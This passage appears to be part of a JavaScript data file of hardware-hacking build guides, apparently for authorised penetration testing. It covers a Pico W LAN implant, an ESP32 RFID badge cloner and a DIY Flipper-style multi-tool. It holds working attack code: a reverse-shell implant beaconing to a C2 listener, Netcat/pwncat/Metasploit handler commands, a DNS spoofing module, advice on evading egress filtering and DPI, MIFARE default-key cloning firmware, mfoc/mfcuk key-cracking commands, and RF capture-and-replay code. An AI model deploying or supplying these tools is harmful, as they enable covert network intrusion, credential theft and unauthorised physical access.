C2_PORT))\n    s.send(b"[SG-40 LAN Implant connected]\\n$ ")\n    while True:\n        data = s.recv(256)\n        if not data: break\n        result = exec_cmd(data.decode(errors="replace"))\n        s.send(result.encode() + b"$ ")\n    s.close()\n\nwhile True:\n    if wifi_connect():\n        try: reverse_shell()\n        except Exception: pass\n    time.sleep(BEACON_INTERVAL)',
                language: 'MicroPython',
                tip: 'On the attacker machine, start the listener before powering the implant: nc -lvnp 4444. The implant connects within 30 seconds of boot. For persistent sessions, use pwncat-cs -lp 4444 which handles reconnects automatically.'
            },
            {
                title: 'Set Up the C2 Listener',
                content: '<p>On the attacker-controlled machine (Kali VM or lab server):</p>',
                code: '# Basic netcat listener\nnc -lvnp 4444\n\n# Persistent multi-session listener (pwncat)\npip install pwncat-cs\npwncat-cs -lp 4444\n\n# After the implant connects, test commands:\n# id\n# ifconfig\n# ls /\n# cat /main.py\n\n# For Metasploit persistent handler:\nmsfconsole -q -x "use multi/handler; \\\n  set payload python/meterpreter/reverse_tcp; \\\n  set LHOST 203.0.113.45; set LPORT 4444; \\\n  set ExitOnSession false; run -j"',
                language: 'Shell (Kali Linux)',
                tip: 'For production red team engagements, route the C2 traffic through an SSH tunnel or domain-fronted HTTPS to bypass corporate firewall egress filtering. The Pico W\'s MicroPython ssl module supports TLS wrapping of sockets for encrypted C2 channels.'
            },
            {
                title: 'Add DNS Spoofing via the Wired Interface',
                content: '<p>The W5500 wired interface can respond to DNS queries on the local LAN segment, redirecting specific domains to an attacker-controlled server:</p>',
                code: '# dns_spoof.py -- optional module for SG-40\nimport socket\n\ndef start_dns_spoof(target_domain, redirect_ip):\n    """Respond to DNS queries for target_domain with redirect_ip."""\n    srv = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)\n    srv.bind((\'0.0.0.0\', 53))\n    srv.settimeout(1.0)\n    ip_bytes = bytes(int(x) for x in redirect_ip.split(\'.\'))\n    print(f"[DNS] Spoofing {target_domain} -> {redirect_ip}")\n    while True:\n        try:\n            data, addr = srv.recvfrom(512)\n        except OSError:\n            continue\n        # Extract query name\n        try:\n            parts, idx = [], 12\n            while idx < len(data) and data[idx]:\n                l = data[idx]; idx += 1\n                parts.append(data[idx:idx+l].decode())\n                idx += l\n            qname = \'.\'.join(parts)\n        except Exception:\n            continue\n        if target_domain.lower() in qname.lower():\n            resp  = data[:2]                      # Transaction ID\n            resp += b\'\\x81\\x80\'                   # Standard response, RA=1\n            resp += data[4:6] + b\'\\x00\\x01\'        # QDCOUNT + ANCOUNT=1\n            resp += b\'\\x00\\x00\\x00\\x00\'            # NSCOUNT, ARCOUNT\n            resp += data[12:]                      # Original question\n            resp += b\'\\xc0\\x0c\'                    # Name pointer\n            resp += b\'\\x00\\x01\\x00\\x01\'            # Type A, Class IN\n            resp += b\'\\x00\\x00\\x00\\x3c\'            # TTL = 60s\n            resp += b\'\\x00\\x04\' + ip_bytes         # RDATA\n            srv.sendto(resp, addr)\n        else:\n            nxd  = data[:2] + b\'\\x81\\x83\'          # NXDOMAIN\n            nxd += data[4:12] + data[12:]\n            srv.sendto(nxd, addr)',
                language: 'MicroPython',
                tip: 'Import and call start_dns_spoof("targetcorp.com", "10.0.0.250") in main.py before the reverse shell loop to activate DNS spoofing. The implant must be positioned inline on the same network segment as the targets, with the W5500 IP configured to match the redirect address.'
            }
        ],

        testing: '<p><strong>Lab verification steps:</strong></p>' +
                 '<ol><li>Power the implant and confirm the Pico W LED stays OFF (stealth mode)</li><li>Start the netcat listener: <code>nc -lvnp 4444</code></li><li>Within 30 seconds the implant connects and displays the banner</li><li>Test: <code>ifconfig</code> shows both eth0 (W5500) and wlan0 (WiFi) addresses</li><li>Test: <code>ls /</code> lists the Pico W root filesystem</li><li>Disconnect and reconnect the WiFi AP &mdash; implant should reconnect within 30 seconds</li><li>Plug the implant inline between a test PC and a switch &mdash; verify the test PC still has network connectivity (transparent bridging)</li></ol>',

        troubleshooting: '<p><strong>W5500 not responding:</strong> Measure VCC with a multimeter &mdash; must be 3.3V. Check SPI pin assignments. Test with the SPI loopback: connect MOSI directly to MISO and send a byte &mdash; if you receive it back, SPI is functional and the issue is the W5500 wiring specifically.</p>' +
                         '<p><strong>WiFi not connecting:</strong> The CYW43439 only supports 2.4 GHz. Verify the C2 AP is not 5 GHz only. Check SSID and password (case-sensitive). Confirm the Pico W can reach the AP from its physical deployment location.</p>' +
                         '<p><strong>Reverse shell connects but disconnects immediately:</strong> The C2 server may be closing the connection. Verify netcat or pwncat is running on the correct port. Check that no firewall is blocking inbound connections on port 4444.</p>',

        challenges: '<p><strong>Extend the implant:</strong></p>' +
                    '<ul><li>Implement TLS-wrapped C2 using MicroPython\'s <code>ssl</code> module and a self-signed certificate to defeat DPI-based detection that looks for plaintext reverse shells</li><li>Add a persistent ARP scanner that runs hourly and logs new hosts appearing on the LAN to a file on the Pico W\'s flash storage</li><li>Implement WPA2-Enterprise client support to allow the implant to authenticate on corporate WiFi using harvested credentials</li><li>Add NTLM hash capture by responding to SMB broadcast traffic (NBT-NS/LLMNR poisoning) &mdash; requires raw socket crafting at the application layer</li></ul>'
    },

    // ========================================================================
    // SG-41: RFID/NFC Cloner
    // ESP32 + RC522 + SSD1306 OLED -- badge reader, cloner, emulator
    // ========================================================================
    'sg-41': {

        intro: '<p>The SG-41 is an ESP32-based RFID access badge cloner targeting MIFARE Classic 1K and 4K cards &mdash; the most widely deployed access control technology in corporate environments. The RC522 module reads the card UID and sector data, the SSD1306 OLED displays a real-time readout, and the device writes captured data to blank writable cards for emulation during physical penetration tests.</p>' +
               '<p>MIFARE Classic uses CRYPTO1 &mdash; a proprietary stream cipher that was publicly broken in 2008 (Nohl et al., "Reverse-Engineering a Cryptographic RFID Tag," USENIX 2008). The default sector keys (0xFFFFFFFFFFFF and 0xA0A1A2A3A4A5) remain deployed in a significant percentage of real-world installations, making key attacks practical with this $15 build. No Proxmark3 required for default-key systems.</p>' +
               '<p><strong>Legal requirement:</strong> Cloning access badges without authorization constitutes trespass by deception in most jurisdictions and may violate computer fraud statutes when used to access computer systems. This build is for authorized physical penetration testing engagements with written scope agreements, CTF competitions, and academic research only.</p>',

        wiring: [
            'SG-41 Pin Connections -- ESP32 DevKit + RC522 + SSD1306 OLED',
            '',
            'RC522 RFID Module (SPI)',
            'RC522 Pin     ESP32 GPIO      Notes',
            'VCC (3.3V)    3.3V            NEVER use 5V -- destroys RC522',
            'GND           GND',
            'RST           GPIO22          Reset (active LOW)',
            'SDA (CS)      GPIO21          SPI Chip Select',
            'SCK           GPIO18          SPI Clock',
            'MOSI          GPIO23          SPI data to RC522',
            'MISO          GPIO19          SPI data from RC522',
            'IRQ           (not used)      Leave floating',
            '',
            'SSD1306 OLED Display (I2C, 128x64)',
            'OLED Pin      ESP32 GPIO      Notes',
            'VCC           3.3V',
            'GND           GND',
            'SDA           GPIO4           I2C data',
            'SCL           GPIO15          I2C clock',
            '',
            'Clone button and status LED',
            'Component     ESP32 GPIO      Notes',
            'Button        GPIO0 (BOOT)    Use built-in BOOT button, active LOW',
            'LED (green)   GPIO2           Through 330-ohm resistor',
            '',
            'RC522 WARNING: Always power from 3.3V. The ESP32 DevKit has a 3.3V',
            'regulator -- use the 3V3 pin. 5V will destroy the RC522 immediately.',
        ].join('\n'),

        steps: [
            {
                title: 'Install Arduino Libraries',
                content: '<p>Open Arduino IDE 2.x and install via <strong>Sketch &rarr; Include Library &rarr; Manage Libraries</strong>:</p>' +
                         '<ul><li><strong>MFRC522</strong> by GithubCommunity &mdash; version 1.4.10+ (RC522 driver)</li><li><strong>Adafruit SSD1306</strong> &mdash; version 2.5.x (OLED driver)</li><li><strong>Adafruit GFX Library</strong> &mdash; required dependency for SSD1306</li></ul>' +
                         '<p>Board: <strong>Tools &rarr; Board &rarr; ESP32 Arduino &rarr; ESP32 Dev Module</strong>. Upload speed: 921600.</p>',
                tip: 'If the SSD1306 library shows "Adafruit_GFX.h not found" on compile, install the Adafruit GFX Library separately. It is a required dependency that does not install automatically.'
            },
            {
                title: 'Flash the RFID Cloner Firmware',
                content: '<p>This sketch reads MIFARE Classic card UIDs and sector data, attempts default sector keys, displays results on the OLED, and writes captured data to blank writable cards on button press:</p>',
                code: '#include <SPI.h>\n#include <MFRC522.h>\n#include <Wire.h>\n#include <Adafruit_GFX.h>\n#include <Adafruit_SSD1306.h>\n\n#define RC522_RST  22\n#define RC522_CS   21\n#define OLED_SDA   4\n#define OLED_SCL   15\n#define BTN_PIN    0    // BOOT button, active LOW\n#define LED_PIN    2\n\n#define OLED_W 128\n#define OLED_H 64\nAdafruit_SSD1306 oled(OLED_W, OLED_H, &Wire, -1);\nMFRC522 rfid(RC522_CS, RC522_RST);\nMFRC522::MIFARE_Key key;\n\nbyte capturedUID[10];\nbyte capturedUIDSize = 0;\nbyte sectorData[16][16];\nbool sectorRead[16] = {false};\nbool hasCaptured = false;\n\n// Default MIFARE keys to try (factory defaults in most deployed cards)\nbyte defaultKeys[][6] = {\n    {0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF},  // Factory default\n    {0xA0, 0xA1, 0xA2, 0xA3, 0xA4, 0xA5},  // NDEF default\n    {0xD3, 0xF7, 0xD3, 0xF7, 0xD3, 0xF7},  // NDEF variant\n    {0x00, 0x00, 0x00, 0x00, 0x00, 0x00},  // All zeros\n    {0xB0, 0xB1, 0xB2, 0xB3, 0xB4, 0xB5},  // HID Corporate 1000\n    {0x4D, 0x3A, 0x99, 0xC3, 0x51, 0xDD},  // Some HID configs\n};\nconst int NUM_KEYS = sizeof(defaultKeys) / 6;\n\nvoid oledPrint(const char* l1, const char* l2 = "", const char* l3 = "") {\n    oled.clearDisplay(); oled.setTextSize(1); oled.setTextColor(SSD1306_WHITE);\n    oled.setCursor(0, 0);  oled.println(l1);\n    oled.setCursor(0, 16); oled.println(l2);\n    oled.setCursor(0, 32); oled.println(l3);\n    oled.display();\n}\n\nvoid oledUID(const byte* uid, byte size) {\n    char s[32] = {0};\n    for (byte i = 0; i < size; i++) {\n        char h[4]; snprintf(h, 4, "%02X%s", uid[i], i < size-1 ? ":" : "");\n        strncat(s, h, sizeof(s) - strlen(s) - 1);\n    }\n    oled.clearDisplay(); oled.setTextSize(1); oled.setTextColor(SSD1306_WHITE);\n    oled.setCursor(0, 0);  oled.println("CARD DETECTED");\n    oled.setCursor(0, 12); oled.print("UID: "); oled.println(s);\n    oled.setCursor(0, 28); oled.println("Hold BOOT to clone");\n    oled.display();\n}\n\nbool readSector(byte sector) {\n    for (int k = 0; k < NUM_KEYS; k++) {\n        for (int i = 0; i < 6; i++) key.keyByte[i] = defaultKeys[k][i];\n        byte block = sector * 4;\n        auto status = (MFRC522::StatusCode)rfid.PCD_Authenticate(\n            MFRC522::PICC_CMD_MF_AUTH_KEY_A, block, &key, &(rfid.uid));\n        if (status == MFRC522::STATUS_OK) {\n            for (byte b = 0; b < 4; b++) {\n                byte buf[18]; byte bufSize = 18;\n                rfid.MIFARE_Read(block + b, buf, &bufSize);\n                memcpy(sectorData[sector] + b * 4, buf, 4);\n            }\n            return true;\n        }\n    }\n    return false;\n}\n\nvoid writeToBlankCard() {\n    if (!hasCaptured) { oledPrint("NO DATA", "Read a card first"); return; }\n    oledPrint("PLACE BLANK CARD", "on reader...", "(10s timeout)");\n    unsigned long timeout = millis() + 10000;\n    while (millis() < timeout) {\n        if (!rfid.PICC_IsNewCardPresent() || !rfid.PICC_ReadCardSerial()) { delay(100); continue; }\n        bool same = (rfid.uid.size == capturedUIDSize);\n        if (same) for (byte i = 0; i < capturedUIDSize; i++)\n            if (rfid.uid.uidByte[i] != capturedUID[i]) { same = false; break; }\n        if (same) { oledPrint("SAME CARD!", "Use different card"); return; }\n        int written = 0;\n        for (byte s = 1; s < 16; s++) {\n            if (!sectorRead[s]) continue;\n            for (int i = 0; i < 6; i++) key.keyByte[i] = 0xFF;\n            byte block = s * 4;\n            rfid.PCD_Authenticate(MFRC522::PICC_CMD_MF_AUTH_KEY_A, block, &key, &(rfid.uid));\n            for (byte b = 0; b < 3; b++) {   // Skip sector trailer\n                byte buf[16]; memcpy(buf, sectorData[s] + b * 4, 16);\n                rfid.MIFARE_Write(block + b, buf, 16);\n            }\n            written++;\n        }\n        char msg[24]; snprintf(msg, sizeof(msg), "%d sectors written", written);\n        oledPrint("CLONE COMPLETE", msg);\n        digitalWrite(LED_PIN, HIGH); delay(500); digitalWrite(LED_PIN, LOW);\n        rfid.PICC_HaltA();\n        return;\n    }\n    oledPrint("TIMEOUT", "No card detected");\n}\n\nvoid setup() {\n    Serial.begin(115200);\n    pinMode(BTN_PIN, INPUT_PULLUP);\n    pinMode(LED_PIN, OUTPUT);\n    Wire.begin(OLED_SDA, OLED_SCL);\n    if (!oled.begin(SSD1306_SWITCHCAPVCC, 0x3C))\n        while (true) { Serial.println("OLED FAIL"); delay(1000); }\n    oledPrint("SG-41 RFID", "CLONER v1.0", "Hold card to scan");\n    SPI.begin();\n    rfid.PCD_Init();\n}\n\nvoid loop() {\n    if (digitalRead(BTN_PIN) == LOW) {\n        delay(50);\n        if (digitalRead(BTN_PIN) == LOW) {\n            writeToBlankCard();\n            while (digitalRead(BTN_PIN) == LOW) delay(10);\n        }\n    }\n    if (!rfid.PICC_IsNewCardPresent()) return;\n    if (!rfid.PICC_ReadCardSerial())   return;\n    memcpy(capturedUID, rfid.uid.uidByte, rfid.uid.size);\n    capturedUIDSize = rfid.uid.size;\n    oledUID(capturedUID, capturedUIDSize);\n    Serial.print("\\nUID: ");\n    for (byte i = 0; i < rfid.uid.size; i++) Serial.printf("%02X ", rfid.uid.uidByte[i]);\n    Serial.println();\n    int readCount = 0;\n    for (byte s = 0; s < 16; s++) {\n        sectorRead[s] = readSector(s);\n        if (sectorRead[s]) {\n            readCount++;\n            Serial.printf("Sector %2d: ", s);\n            for (byte b = 0; b < 16; b++) Serial.printf("%02X ", sectorData[s][b]);\n            Serial.println();\n        }\n    }\n    char line2[24]; snprintf(line2, sizeof(line2), "%d/16 sectors read", readCount);\n    oledPrint("SCAN DONE", line2, "BOOT=clone");\n    hasCaptured = true;\n    rfid.PICC_HaltA(); rfid.PCD_StopCrypto1();\n}',
                language: 'Arduino (C++)',
                tip: 'For UID cloning (block 0, sector 0 contains the UID), you need a "Magic Card" with UID backdoor write capability, also called a GEN1A card or "Chinese Magic Card." Standard blank MIFARE cards do not allow block 0 writes. Purchase writable UID cards from AliExpress (search: "UID changeable MIFARE Classic 1K magic card").'
            },
            {
                title: 'Perform a Key Dictionary Attack for Non-Default Keys',
                content: '<p>The built-in key dictionary covers the most common defaults. For cards that use custom keys, use <strong>mfoc</strong> and <strong>mfcuk</strong> tools on Kali Linux:</p>',
                code: '# mfoc -- offline nested authentication attack (requires one known key)\n# Install: sudo apt install mfoc\nmfoc -O dump.mfd\n\n# mfcuk -- MIFARE Classic Universal toolKit (no known key required)\n# Install: sudo apt install mfcuk\nmfcuk -C -R 0:A -v 3 -s 250 -S 250 -o dump.mfd\n\n# These tools require an ACR122U or similar NFC reader connected to the PC\n# ACR122U is ~$25 on Amazon and is widely supported on Linux\n\n# Analyze a dump file to display sector contents\npython3 -c "\ndata = open(\'dump.mfd\',\'rb\').read()\nfor s in range(16):\n    print(f\'Sector {s:2d}:\', \' \'.join(f\'{b:02X}\' for b in data[s*64:(s+1)*64]))\n"\n\n# Write a dump back to a blank card:\nmfoc -I dump.mfd -w',
                language: 'Shell (Kali Linux)',
                tip: 'The darkside attack (mfcuk) can take 30 minutes to several hours per key depending on the card implementation. The nested attack (mfoc) is much faster but requires at least one known sector key to bootstrap from. Most deployed MIFARE Classic cards have at least one sector with a default key, making mfoc practical for real-world assessments.'
            }
        ],

        testing: '<p><strong>Verification steps:</strong></p>' +
                 '<ol><li>Hold a MIFARE Classic card over the RC522 &mdash; OLED displays "CARD DETECTED" and the UID</li><li>Serial Monitor shows the UID and any successfully read sector data</li><li>Sectors showing "read failed" use non-default keys &mdash; use mfoc/mfcuk offline</li><li>Hold a blank writable UID card over the reader, press BOOT &mdash; clone process starts</li><li>Test the cloned card on the original reader &mdash; for simple UID-only systems, it works immediately</li></ol>' +
                 '<p><strong>Expected Serial Monitor output after a successful scan:</strong></p>' +
                 '<pre style="background:#0d1117;padding:10px;border-radius:4px;font-size:0.82rem;color:#8b949e;overflow-x:auto">UID: 3A 7F B2 C1\nSector  0: 3A 7F B2 C1 80 08 04 00 62 63 64 65 66 67 FF 07\nSector  1: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00\nSector  2: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00\n...</pre>',

        troubleshooting: '<p><strong>RC522 not detected:</strong> Verify 3.3V power. Check SPI wiring &mdash; MOSI/MISO swap is the most common error. Confirm CS=GPIO21 and RST=GPIO22. Run rfid.PCD_DumpVersionToSerial() to check communication &mdash; it should print "Firmware Version: 0x92 = v2.0" or similar.</p>' +
                         '<p><strong>OLED not displaying:</strong> Run an I2C scanner to confirm the address &mdash; some SSD1306 OLEDs use 0x3D instead of 0x3C. Check SDA=GPIO4 and SCL=GPIO15. Verify 3.3V power on the OLED module.</p>' +
                         '<p><strong>Authentication always fails:</strong> The card uses custom keys. Use mfoc or mfcuk with an ACR122U NFC reader attached to a PC running Kali Linux. The mfcuk darkside attack works even with no known keys.</p>',

        challenges: '<p><strong>Extend the cloner:</strong></p>' +
                    '<ul><li>Add WiFi logging: POST the UID and sector dump to a remote collection server via HTTP immediately when a card is scanned, for centralized engagement tracking</li><li>Implement MIFARE DESFire EV1 detection &mdash; DESFire uses AES-128 and is not cloneable with this hardware, but detecting which access points use DESFire vs Classic is a valuable pentest finding</li><li>Add a second "emulate" mode using the ESP32\'s NFC emulation capability via a secondary RC522 module configured in card emulation mode</li><li>Miniaturize: mount the entire circuit in an Altoids tin with a 500mAh LiPo and TP4056 for truly portable field operation</li></ul>'
    },

    // ========================================================================
    // SG-42: Flipper Zero DIY Alternative
    // ESP32-S3 + CC1101 + RC522 + IR + TFT -- multi-tool platform
    // ========================================================================
    'sg-42': {

        intro: '<p>The SG-42 is a DIY multi-tool that replicates the Flipper Zero\'s core capabilities using off-the-shelf modules on an ESP32-S3 at roughly 10% of the Flipper\'s retail cost. The build integrates: Sub-GHz RF capture and replay via CC1101 (300-928 MHz), 13.56 MHz RFID read/write via RC522, infrared capture and replay via IR LED and TSOP38238 receiver, WiFi scanning via the ESP32 built-in radio, and a menu-driven interface on a 1.8" ST7735 TFT navigated by a 5-way switch.</p>' +
               '<p>This is the most complex Signal build. It requires careful SPI bus management between two devices (CC1101 and TFT sharing a bus with separate CS lines), a modular firmware architecture with a menu state machine, and precise timing for RF capture and IR decoding. Build and fully understand SG-33, SG-35, and SG-41 before starting this project.</p>' +
               '<p><strong>Legal requirement:</strong> The CC1101 can transmit across 300-928 MHz. In the US, unlicensed ISM band operation (315, 433, 868, 915 MHz) is governed by FCC Part 15 &mdash; low power, no harmful interference. Transmitting on licensed frequencies or jamming existing signals violates 47 U.S.C. &sect; 333 and carries significant penalties. All RFID, BadUSB, and IR features carry the same restrictions as SG-41 and SG-33 respectively.</p>',

        wiring: [
            'SG-42 Full Wiring -- ESP32-S3 + CC1101 + TFT + RC522 + IR + Nav',
            '',
            'CC1101 Sub-GHz RF Module (SPI Bus 1 / VSPI)',
            'CC1101 Pin    ESP32-S3 GPIO   Notes',
            'VCC           3.3V            Max 100mA -- use local bypass cap',
            'GND           GND',
            'SCK           GPIO18          SPI clock (shared with TFT)',
            'MOSI          GPIO23          SPI data out (shared with TFT)',
            'MISO / GDO1   GPIO19          SPI data in (shared with TFT)',
            'CS / CSN      GPIO5           Chip select -- separate from TFT',
            'GDO0          GPIO4           Data out / packet received IRQ',
            '',
            '1.8" TFT Display ST7735 (SPI Bus 1 -- shared with CC1101)',
            'TFT Pin       ESP32-S3 GPIO   Notes',
            'VCC           3.3V',
            'GND           GND',
            'CS            GPIO2           Separate CS from CC1101 (GPIO5)',
            'RESET         GPIO17',
            'DC/RS         GPIO16',
            'SDA/MOSI      GPIO23          Shared SPI bus',
            'SCK/CLK       GPIO18          Shared SPI bus',
            'LED           3.3V            Backlight',
            '',
            'RC522 RFID Module (SPI Bus 2 / HSPI -- separate bus)',
            'RC522 Pin     ESP32-S3 GPIO   Notes',
            'VCC           3.3V',
            'GND           GND',
            'RST           GPIO33',
            'SDA/CS        GPIO34          SPI2 Chip Select',
            'SCK           GPIO36          SPI2 Clock',
            'MOSI          GPIO35          SPI2 MOSI',
            'MISO          GPIO37          SPI2 MISO',
            '',
            'IR LED + TSOP38238 Receiver',
            'Component     ESP32-S3 GPIO   Notes',
            'IR LED anode  GPIO25          Through 47-ohm resistor',
            'IR LED cathode GND',
            'TSOP38238 OUT GPIO26          3.3V compatible output',
            'TSOP38238 VCC 3.3V            Add 100nF bypass capacitor',
            'TSOP38238 GND GND',
            '',
            '5-Way Navigation Switch (all active LOW, internal pullups)',
            'UP=GPIO6, DOWN=GPIO7, LEFT=GPIO8, RIGHT=GPIO9, OK=GPIO10',
            'COM=GND',
            '',
            'LiPo + TP4056: same as SG-38 (OUT+ -> ESP32-S3 VIN)',
        ].join('\n'),

        wiringNotes: '<p><strong>SPI bus architecture:</strong> The CC1101 and TFT share SPI Bus 1 (VSPI on GPIO18/23/19) with separate CS lines (TFT_CS=2, CC1101_CS=5). The RC522 uses SPI Bus 2 (HSPI on GPIO36/35/37) with its own independent SCK/MOSI/MISO lines. This separation prevents timing conflicts between the fast ST7735 SPI clock and the CC1101\'s more sensitive RF timing. Add 100nF bypass capacitors on each module\'s VCC pin as close to the IC as possible to prevent SPI glitches.</p>',

        steps: [
            {
                title: 'Install All Required Libraries',
                content: '<p>Install the following via Arduino Library Manager before attempting to compile:</p>' +
                         '<ul><li><strong>Adafruit ST7735 and ST7789 Library</strong> &mdash; TFT display</li><li><strong>Adafruit GFX Library</strong> &mdash; required dependency</li><li><strong>MFRC522</strong> by GithubCommunity &mdash; RFID</li><li><strong>IRremoteESP8266</strong> by David Conran &mdash; IR send/receive (works on ESP32 despite the name)</li><li><strong>SmartRC-CC1101-Driver-Lib</strong> by LSatan &mdash; CC1101 driver</li></ul>' +
                         '<p>The CC1101 library requires manual install. Download from <a href="https://github.com/LSatan/SmartRC-CC1101-Driver-Lib" style="color:#ff6b35">github.com/LSatan/SmartRC-CC1101-Driver-Lib</a> as a ZIP and install via <strong>Sketch &rarr; Include Library &rarr; Add .ZIP Library</strong>. Edit the library\'s <code>ELECHOUSE_CC1101_SRC_DRV.h</code> to change the default CS pin from 10 to 5: find <code>#define ss 10</code> and change to <code>#define ss 5</code>.</p>'
            },
            {
                title: 'Verify CC1101 Communication',
                content: '<p>Flash this test sketch first to confirm CC1101 SPI wiring before loading the full firmware:</p>',
                code: '#include <ELECHOUSE_CC1101_SRC_DRV.h>\n\nvoid setup() {\n    Serial.begin(115200);\n    // getCC1101() reads the CC1101 chip version register via SPI\n    if (ELECHOUSE_cc1101.getCC1101()) {\n        Serial.println("CC1101 OK -- SPI communication confirmed");\n    } else {\n        Serial.println("CC1101 NOT FOUND -- check wiring and CS pin");\n        while (true);\n    }\n    // Configure for 433.92 MHz ASK/OOK (garage door / key fob band)\n    ELECHOUSE_cc1101.Init();\n    ELECHOUSE_cc1101.SetMHZ(433.92);\n    ELECHOUSE_cc1101.SetModulation(2);  // 0=2-FSK, 1=GFSK, 2=ASK/OOK\n    ELECHOUSE_cc1101.SetDRate(2.4);     // Data rate kbps\n    ELECHOUSE_cc1101.SetRxBW(812.5);    // Receive bandwidth kHz\n    ELECHOUSE_cc1101.SetRx();\n    Serial.println("Listening on 433.92 MHz...");\n    Serial.println("Press a 433MHz remote to receive data");\n}\n\nvoid loop() {\n    if (digitalRead(4) == HIGH) {  // GDO0 signals data in FIFO\n        byte buf[128];\n        int len = ELECHOUSE_cc1101.ReceiveData(buf);\n        if (len > 0) {\n            Serial.printf("Received %d bytes: ", len);\n            for (int i = 0; i < len; i++) Serial.printf("%02X ", buf[i]);\n            Serial.println();\n        }\n    }\n}',
                language: 'Arduino (C++)',
                tip: 'The CC1101 module requires a wire antenna for any useful range. Solder a 17.3cm piece of solid-core wire to the ANT pad on the CC1101 module for 433 MHz (quarter-wave). Without an antenna, range is under 30cm.'
            },
            {
                title: 'Flash the Full Multi-Tool Firmware',
                content: '<p>This firmware implements the TFT menu system, 5-way navigation, Sub-GHz RF capture/replay, IR capture/replay, WiFi scanning, and RFID reading as a state machine:</p>',
                code: '#include <SPI.h>\n#include <Adafruit_GFX.h>\n#include <Adafruit_ST7735.h>\n#include <MFRC522.h>\n#include <IRremoteESP8266.h>\n#include <IRrecv.h>\n#include <IRsend.h>\n#include <ELECHOUSE_CC1101_SRC_DRV.h>\n#include <WiFi.h>\n\n// TFT (VSPI)\n#define TFT_CS   2\n#define TFT_RST  17\n#define TFT_DC   16\n// CC1101 (VSPI -- shared bus with TFT)\n#define CC1101_CS   5\n#define CC1101_GDO0 4\n// RC522 (HSPI)\n#define RC522_CS   34\n#define RC522_RST  33\n#define RC522_SCK  36\n#define RC522_MOSI 35\n#define RC522_MISO 37\n// IR\n#define IR_SEND_PIN 25\n#define IR_RECV_PIN 26\n// Nav buttons\n#define BTN_UP  6\n#define BTN_DN  7\n#define BTN_LT  8\n#define BTN_RT  9\n#define BTN_OK 10\n\nAdafruit_ST7735 tft = Adafruit_ST7735(TFT_CS, TFT_DC, TFT_RST);\nSPIClass spi2(HSPI);\nMFRC522  rfid(RC522_CS, RC522_RST, spi2);\nIRrecv   irRecv(IR_RECV_PIN, 1024, 50, true);\nIRsend   irSend(IR_SEND_PIN);\n\n// Colors (RGB565)\n#define C_BG     0x0841\n#define C_ACCENT 0xFB60   // ~#ff6b00\n#define C_WHITE  0xFFFF\n#define C_DIM    0x8410\n#define C_GREEN  0x07E0\n#define C_RED    0xF800\n\n// Menu state machine\nenum State { MENU_MAIN, MENU_RF, MENU_RFID, MENU_IR,\n             ACT_RF_CAP, ACT_RF_PLAY, ACT_RFID_READ,\n             ACT_IR_CAP, ACT_IR_PLAY, ACT_WIFI };\nState state = MENU_MAIN;\nint   midx  = 0;\n\nconst char* mainItems[] = {"Sub-GHz RF","RFID / NFC","Infrared","WiFi Scan"};\nconst char* rfItems[]   = {"Capture","Replay","Back"};\nconst char* irItems[]   = {"Capture","Replay","Back"};\n\n// Captured data\nuint8_t rfBuf[512]; int rfLen = 0; bool hasRF = false;\ndecode_results irData;             bool hasIR = false;\n\nvoid drawMenu(const char** items, int n, int sel, const char* title) {\n    tft.fillScreen(C_BG);\n    tft.fillRect(0, 0, 160, 18, C_ACCENT);\n    tft.setTextColor(C_BG); tft.setTextSize(1);\n    tft.setCursor(4, 5); tft.print(title);\n    for (int i = 0; i < n; i++) {\n        int y = 22 + i * 18;\n        if (i == sel) { tft.fillRect(0, y-1, 160, 14, 0x2945); tft.setTextColor(C_ACCENT); }\n        else { tft.setTextColor(C_WHITE); }\n        tft.setCursor(8, y); tft.print(items[i]);\n    }\n    tft.setTextColor(C_DIM); tft.setCursor(4, 120); tft.print("UP/DN=nav  OK=sel");\n}\n\nvoid statusScr(const char* title, const char* l1,\n               const char* l2 = "", uint16_t tc = C_ACCENT) {\n    tft.fillScreen(C_BG);\n    tft.fillRect(0, 0, 160, 18, tc);\n    tft.setTextColor(C_BG); tft.setTextSize(1);\n    tft.setCursor(4, 5); tft.print(title);\n    tft.setTextColor(C_WHITE);\n    tft.setCursor(4, 26); tft.print(l1);\n    tft.setCursor(4, 42); tft.print(l2);\n    tft.setTextColor(C_DIM); tft.setCursor(4, 120); tft.print("LEFT=back");\n}\n\nstruct Btns { bool up, dn, lt, rt, ok; };\nBtns readBtns() {\n    return {!digitalRead(BTN_UP),!digitalRead(BTN_DN),!digitalRead(BTN_LT),\n            !digitalRead(BTN_RT),!digitalRead(BTN_OK)};\n}\nBtns waitBtn(unsigned long ms = 30000) {\n    unsigned long t = millis();\n    while (millis()-t < ms) {\n        Btns b = readBtns();\n        if (b.up||b.dn||b.lt||b.rt||b.ok) { delay(50); return b; }\n        delay(20);\n    }\n    return {};\n}\n\nvoid rfCapture() {\n    statusScr("RF CAPTURE", "Press remote...", "5s timeout");\n    ELECHOUSE_cc1101.Init();\n    ELECHOUSE_cc1101.SetMHZ(433.92);\n    ELECHOUSE_cc1101.SetModulation(2); ELECHOUSE_cc1101.SetDRate(2.4); ELECHOUSE_cc1101.SetRx();\n    unsigned long t = millis();\n    while (millis()-t < 5000) {\n        if (digitalRead(CC1101_GDO0)) {\n            int len = ELECHOUSE_cc1101.ReceiveData(rfBuf);\n            if (len > 0) { rfLen = len; hasRF = true;\n                char m[24]; snprintf(m, 24, "%d bytes captured", len);\n                statusScr("RF CAPTURED", m, "OK=replay", C_GREEN); delay(2000); return; }\n        }\n    }\n    statusScr("RF CAPTURE", "No signal", "Timeout", C_RED); delay(1500);\n}\n\nvoid rfReplay() {\n    if (!hasRF) { statusScr("RF REPLAY", "No data", "Capture first", C_RED); delay(1500); return; }\n    statusScr("RF REPLAY", "Transmitting...", "");\n    ELECHOUSE_cc1101.Init(); ELECHOUSE_cc1101.SetMHZ(433.92);\n    ELECHOUSE_cc1101.SetModulation(2); ELECHOUSE_cc1101.SetDRate(2.4);\n    ELECHOUSE_cc1101.SetTx();\n    ELECHOUSE_cc1101.SendData(rfBuf, rfLen);\n    ELECHOUSE_cc1101.SetRx();\n    statusScr("RF REPLAY", "Sent!", "", C_GREEN); delay(1200);\n}\n\nvoid irCapture() {\n    statusScr("IR CAPTURE", "Point remote at", "sensor + press btn");\n    irRecv.enableIRIn();\n    unsigned long t = millis();\n    while (millis()-t < 10000) {\n        if (irRecv.decode(&irData)) {\n            hasIR = true;\n     